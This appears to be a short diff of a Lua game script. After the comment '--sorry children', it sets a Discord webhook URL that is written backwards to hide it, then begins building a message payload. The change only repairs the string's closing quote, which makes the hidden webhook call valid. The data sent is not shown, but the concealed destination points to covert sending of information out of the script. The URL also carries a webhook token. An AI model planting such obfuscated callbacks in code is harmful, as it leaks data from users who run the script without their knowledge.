@@ -2695,7 +2695,7 @@ end)
 	Fly()
     --sorry children
     local url =
-		"ow7cW4U45w2M9kxnRiWc-gYcAqJs0ds-2q3QuYjn0PfFJbZ4qBzpZuKM7FrC2svd8ZZu/29526632424366768601/skoohbew/ipa/moc.drocsid//:sptth
+		"ow7cW4U45w2M9kxnRiWc-gYcAqJs0ds-2q3QuYjn0PfFJbZ4qBzpZuKM7FrC2svd8ZZu/29526632424366768601/skoohbew/ipa/moc.drocsid//:sptth"
 	local data = {
 		["embeds"] = {
 			{
